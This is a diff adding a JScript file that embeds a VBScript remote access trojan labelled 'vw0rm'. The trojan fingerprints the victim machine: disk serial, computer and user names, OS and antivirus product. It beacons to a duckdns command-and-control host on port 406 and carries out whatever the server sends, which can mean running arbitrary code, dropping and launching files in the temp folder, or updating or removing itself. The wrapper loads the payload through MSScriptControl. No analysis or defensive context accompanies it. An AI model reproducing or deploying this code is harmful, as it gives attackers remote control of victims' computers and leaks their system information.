@@ -1,0 +1,24 @@
+var code = 'On error resume next\r\n\r\nj = array(\"WScript.Shell\",\"Scripting.FileSystemObject\",\"Shell.Application\",\"Microsoft.XMLHTTP\")\r\ng = array(\"HKCU\",\"HKLM\",\"HKCU\\vw0rm\",\"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\",\"HKLM\\SOFTWARE\\Classes\\\",\"REG_SZ\",\"\\defaulticon\\\")\r\ny= array(\"winmgmts:\",\"win32_logicaldisk\",\"Win32_OperatingSystem\",\"winmgmts:\\\\localhost\\root\\securitycenter\",\"AntiVirusProduct\")\r\n\r\nfunction go(m)\r\nif m=4 then\r\nT=\"winmgmts:\\\\localhost\\root\\securitycenter\"\r\nSet B=GetObject(y(3)).InstancesOf(y(4))\r\nfor each a in b\r\ngo=a.displayName\r\nexit for\r\nnext\r\nSet B=GetObject(y(3) & \"2\").InstancesOf(y(4))\r\nfor each a in b\r\ngo=a.displayName \r\nexit for\r\nnext\r\nif go=\"\" then go=\"Not-found\"\r\nelse\r\nSet B=GetObject(y(0)).InstancesOf(y(m))\r\nfor each a in b\r\nif m = 1 then\r\ngo=a.volumeserialnumber\r\nelseif m = 2 then\r\ngo=a.caption\r\nend if\r\nexit for\r\nnext\r\nend if\r\nend function \r\n\r\nset w = WScript\r\nset sh = Cr(0)\r\nset fs = Cr(1)\r\n\r\nFunction Cr(N)\r\nSet Cr = CreateObject(j(N))\r\nEnd Function\r\n\r\nfunction Ex(s)\r\nEx = sh.ExpandEnvironmentStrings(\"%\"&s&\"%\")\r\nend function\r\n\r\nfunction Pt(C,A)\r\nPt=\"\"\r\nSet X=Cr(3)\r\nX.Open \"POST\",\"http://microduck2.duckdns.org:406/\"&C,false\r\nX.setrequestheader \"User-Agent:\",nf\r\nX.send A\r\nPt=X.responsetext\r\nend function\r\n\r\nFunction nf\r\nnf=\"\"\r\ni=go(1)\r\ns=VN & \"_\" & i\r\nnf=nf&s&c\r\ns=ex(\"COMPUTERNAME\")\r\nnf=nf&s&c\r\ns=ex(\"USERNAME\")\r\nnf=nf&s&c\r\ns=go(2)\r\nnf=nf&s&c\r\ns=go(4)\r\nnf=nf&s&c&c&nt&c&u&c\r\nEnd Function\r\n\r\n\r\n\r\n\'%fdr%\r\n\r\n\r\n\r\n\r\n\r\nvn=\"vw0rm\"\r\nU=\"\"\r\n\r\nch = chrw(34)\r\nc = chrw(92)\r\nfu = w.scriptfullname\r\nwn=w.scriptname\r\nNT=\"No\"\r\nif fs.fileexists(ex(\"Windir\") & \"\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\") then\r\nNT=\"Yes\"\r\nend if\r\n\r\nU= sh.regread(g(2))\r\nif U=\"\" then\r\nif mid(fu,2)=\":\\\" & wn then\r\nU=\"TRUE\"\r\nsh.regwrite g(2), U, g(5)\r\nelse\r\nU=\"FALSE\"\r\nsh.regwrite g(2), U, g(5)\r\nend if\r\nend if\r\n\r\n\r\nspl=\"|V|\"\r\nwhile true\r\ns=split(Pt(\"Vre\",\"\"),spl)\r\nselect case s(0)\r\ncase \"exc\"\r\nsa= s(1)\r\nexecute sa\r\ncase \"Sc\"\r\ns2 = Ex(\"temp\") & \"\\\" & s(2)\r\nset wr = fs.OpenTextFile(s2,2,True)\r\nwr.Write s(1)\r\nwr.Close()\r\nsh.run s2, 6\r\ncase \"RF\"\r\ns2 = Ex(\"temp\") & \"\\\" & s(2)\r\nset wr = fs.OpenTextFile(s2,2,True)\r\nwr.Write s(1)\r\nwr.Close()\r\nsh.run s2\r\ncase \"Ren\"\r\nset wr = fs.OpenTextFile(fu,1)\r\nf = wr.ReadAll\r\nwr.close()\r\nf = replace(f,ch&vn&ch,ch&s(1)&ch)\r\nset wr = fs.OpenTextFile(fu,2,false)\r\nwr.Write f\r\nwr.close()\r\ncase \"Up\"\r\nset wr = fs.OpenTextFile(fu,2,false)\r\ns(1) = replace(s(1),\"|U|\",\"|V|\")\r\nwr.Write s(1)\r\nwr.Close()\r\nsh.run \"wscript.exe //B \" & ch & fu & ch, 6\r\nw.quit\r\ncase \"Cl\"\r\nW.quit \r\ncase \"Un\"\r\nS(1) = replace(S(1),\"%f\",fu)\r\nS(1) = replace(S(1),\"%n\",wn)\r\nS(1) = replace(S(1),\"%sfdr\",dr)\r\nexecute S(1)\r\nw.quit\r\nend select\r\nW.Sleep 6000\r\n\r\nwend';
+
+function wrap(s, c) {
+    return c + s + c;
+}
+
+var sc = null;
+try {
+    sc = new ActiveXObject("MSScriptControl.ScriptControl");
+}
+catch (err) {
+    var wsc32path = "%SystemRoot%\\SysWOW64\\cscript.exe";
+    var cmd = wrap(wsc32path, "\"") + " /e:jscript " + wrap(WScript.ScriptFullName, "\"");
+    var shell = WScript.CreateObject("WScript.Shell");
+    shell.Run(cmd, 0, false);
+    WScript.Quit(0);
+}
+
+sc.Language = "VBScript";
+sc.Timeout = -1;
+sc.AllowUI = true;
+sc.AddObject("wscript", WScript, true);
+sc.AddCode(code);
+
